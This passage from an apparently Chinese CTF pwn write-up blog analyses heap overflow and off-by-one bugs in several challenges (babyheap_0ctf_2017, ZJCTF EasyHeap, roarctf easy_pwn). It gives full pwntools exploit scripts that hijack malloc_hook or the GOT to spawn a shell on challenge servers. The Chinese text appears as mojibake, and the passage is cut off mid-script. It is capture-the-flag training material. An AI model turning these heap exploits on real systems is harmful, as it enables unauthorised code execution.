class="hljs-number">1</span>)+p32(data)+p32(<span class="hljs-number">0x30</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="SWPUCTF-2019-login">SWPUCTF_2019_login</h3><p>éæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²åˆ©ç”¨</p><p>å¦‚æœå †é¢˜ï¼Œä¿æŠ¤gotè¡¨å¯å†™ï¼Œå’Œæ²¡å¼€pieçš„è¯ï¼Œå°±æ˜¯è¦ç”¨åŠ«æŒgotæ¥åšï¼Œshowæ¥æ³„éœ²gotå¾—åˆ°libcbase</p><h3 id="babyheap-0ctf-2017-2">babyheap_0ctf_2017:</h3><h4 id="åŠŸèƒ½åˆ†æï¼š">åŠŸèƒ½åˆ†æï¼š</h4><p>å¸¸è§„èœå•é¢˜ï¼ŒåŠŸèƒ½é½å…¨</p><h4 id="æ¼æ´ç‚¹ï¼šå †æº¢å‡º">æ¼æ´ç‚¹ï¼šå †æº¢å‡º</h4><p>å¯ä»¥å †æº¢å‡ºï¼Œaddå‡½æ•°å’Œfillå‡½æ•°åˆ†å¼€ï¼Œfillå¡«çš„å¤§å°æ²¡æœ‰æ£€æŸ¥ã€‚</p><h4 id="åˆ©ç”¨æ–¹æ³•ï¼š">åˆ©ç”¨æ–¹æ³•ï¼š</h4><p><strong>å †æº¢å‡º-&gt;unsortbin  leak-&gt;å †åˆ†é…è‡³malloc_hook-&gt;åŠ«æŒhookä¸ºog</strong></p><p>1.å †æº¢å‡ºä¿®æ”¹chunkå¤§å°è‡³å°‘ä¸º0x91ï¼ˆunsortbinæœ€å°å¤§å°ï¼‰ï¼Œfreeåˆ°unsortbinï¼Œunsortbiné‡Œfdå’Œbkæœ‰æŒ‡å‘main_areana+88åœ°å€ï¼Œç”³è¯·å †å—ï¼Œå…¶åœ°å€ä¼šå¯¹åº”ä¸‹ç§»ï¼Œç”³è¯·å †å—ä½¿å…¶åœ°å€åˆ°ä¸€ä¸ªæ­£åœ¨ä½¿ç”¨çš„å †å—ï¼Œç”¨showå‡½æ•°æ³„éœ²äº†malloc_hookåœ°å€ï¼Œå†å¾—å‡ºlibc_baseï¼Œlibc_base+malloc,libc+ogã€‚</p><p>2.é‡Šæ”¾0x60å †å—ï¼Œè¿ç”¨å †æº¢å‡ºæ”¹freeå—çš„biné“¾åˆ°malloc_hook-0x23å¤„ï¼Œï¼ˆlibc2.23ç”¨0x7fç»•è¿‡æ£€æŸ¥ï¼‰ï¼Œç”³è¯·ä¸¤æ¬¡åï¼Œç”³è¯·å †å—åˆ°malloc_hook-0x23å¤„ï¼Œå¡«å…¥ogï¼Œæœ€åç”³è¯·addè§¦å‘ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./babyheap_0ctf_2017&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/2.23/libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25542</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">size</span>):<br>     sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">index,content</span>):<br>     sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>     sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>     sla(<span class="hljs-string">&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>     sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">index</span>):<br>     sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#-------------------------------------------------------</span><br><br>alloc(<span class="hljs-number">0x10</span>) <br>alloc(<span class="hljs-number">0x60</span>) <br>alloc(<span class="hljs-number">0x10</span>) <br>alloc(<span class="hljs-number">0x10</span>) <br>fill(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x91</span>)) <br>free(<span class="hljs-number">1</span>) <br>alloc(<span class="hljs-number">0x60</span>) <br>dump(<span class="hljs-number">2</span>) <br>addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:]) <br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(addr) <br>libc_base=addr-<span class="hljs-number">88</span>-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">0x10</span> <br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base) <br>hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] <br>shell=libc_base+o_g_old[<span class="hljs-number">1</span>] <br><span class="hljs-comment">#------------------------------------------------------- </span><br>free(<span class="hljs-number">1</span>) <br>fill(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x71</span>)+p64(hook-<span class="hljs-number">0x23</span>)) <br>alloc(<span class="hljs-number">0x60</span>) <br>alloc(<span class="hljs-number">0x60</span>) <br>fill(<span class="hljs-number">4</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(shell)) <br>alloc(<span class="hljs-number">0x20</span>) <br><span class="hljs-comment">#gdb.attach(r) </span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ZJCTF-2019-EasyHeap-2">[ZJCTF 2019]EasyHeap:</h3><h4 id="åŠŸèƒ½åˆ†æï¼š-2">åŠŸèƒ½åˆ†æï¼š</h4><p>æœ‰ä¸ªsystemï¼Œæ²¡æœ‰showå‡½æ•°</p><h4 id="æ¼æ´ç‚¹ï¼šå †æº¢å‡º-2">æ¼æ´ç‚¹ï¼šå †æº¢å‡º</h4><p>å †æº¢å‡ºï¼Œaddå‡½æ•°å’Œfillå‡½æ•°sizeæ²¡æœ‰å…³è”ï¼Œä¿æŠ¤æªæ–½Partial RELROï¼Œgotè¡¨å¯å†™ï¼Œpieä¹Ÿæ²¡å¼€ï¼Œä¸ç”¨æ³„éœ²libcåŸºå€äº†</p><h4 id="åˆ©ç”¨æ–¹æ³•ï¼š-2">åˆ©ç”¨æ–¹æ³•ï¼š</h4><p><strong>å †æº¢å‡º-&gt;å †åˆ†é…è‡³heaparray-&gt;gotè¡¨åŠ«æŒä¸ºsystem</strong></p><p>è¿™é¢˜æœ‰heaparrayåœ¨bssæ®µç»´æŠ¤å †ï¼Œåˆ©ç”¨å †æº¢å‡ºä¿®æ”¹freeçš„å †å—çš„fdç”³è¯·å †å—åˆ°heaparrayï¼Œç”¨bssæ®µçš„stdinçš„0x7fç»•è¿‡fastbinæ£€æŸ¥</p><p>ä¿®æ”¹heaparrayçš„æŒ‡é’ˆæŒ‡å‘free_got,free_gotå¡«å…¥systemã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./easyheap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/2.23/libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29503</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-----------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>     sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>     sa(<span class="hljs-string">&#x27;Content of heap:&#x27;</span>,<span class="hljs-built_in">str</span>(content))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>     sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>     sla(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>     sla(<span class="hljs-string">&#x27;Content of heap : &#x27;</span>,<span class="hljs-built_in">str</span>(content))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>     sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#----------------------------------------------------------</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;pppp&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;pppp&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x71</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">13</span>+p64(<span class="hljs-number">0x71</span>)+p64(<span class="hljs-number">0x6020c0</span>-<span class="hljs-number">0x13</span>))<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;pppp&#x27;</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>edit(<span class="hljs-number">0</span>,p64(elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>free(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="roarctf-2019-easy-pwnï¼š">roarctf_2019_easy_pwnï¼š</h3><h4 id="åŠŸèƒ½åˆ†æï¼š-3">åŠŸèƒ½åˆ†æï¼š</h4><p>åŠŸèƒ½é½å…¨ï¼Œç”¨heaparrayç»“æ„ä½“ç»´æŠ¤å †ï¼Œ</p><h4 id="æ¼æ´ç‚¹ï¼šof-by-one">æ¼æ´ç‚¹ï¼šof by one</h4><p>sizeåœ¨addå’Œedité‡Œå…³è”èµ·æ¥äº†ï¼Œä½†æœ‰ä¸ªoff by oneï¼Œå¦‚æœedit sizeå¤§äºadd size=10èƒ½å¤šè¾“å…¥ä¸ªå­—èŠ‚</p><h4 id="åˆ©ç”¨æ–¹æ³•ï¼š-3">åˆ©ç”¨æ–¹æ³•ï¼š</h4><p><strong>of by one -&gt;unsortbin leak-&gt;chunkå¤ç”¨-&gt;ä¿®æ”¹fastbinçš„fd ä¸ºmalloc_hook-&gt;åŠ«æŒmalloc_hookä¸ºog</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./roarctf_2019_easy_pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26062</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><br><span class="hljs-comment">#-----------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br> sla(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):<br> sla(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br> sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br> sla(<span class="hljs-string">&#x27;content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#-----------------------------------------</span><br>add(<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>+<span class="hljs-number">10</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p8(<span class="hljs-number">0x91</span>))<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x10</span>)<br>show(<span class="hljs-number">2</span>)<br>addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(addr)<br>base=addr-<span class="hljs-number">88</span>-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">0x10</span><br>system=addr+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook=base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>malloc_hook=base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>og=base+o_g_old[<span class="hljs-number">1</span>]<br><span class="hljs-comment">#---------------------------------</span><br>add(<span class="hljs-number">0x60</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>+<span class="hljs-number">10</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p8(<span class="hljs-number">0x71</span>))<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x50</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">9</span>+p64(<span class="hljs-number">0x21</span>))<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x60</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x20</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x71</span>))<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x28</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x71</span>)+p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x60</span>)<br>edit(<span class="hljs-number">5</span>,<span class="hljs-number">0x13</span>+<span 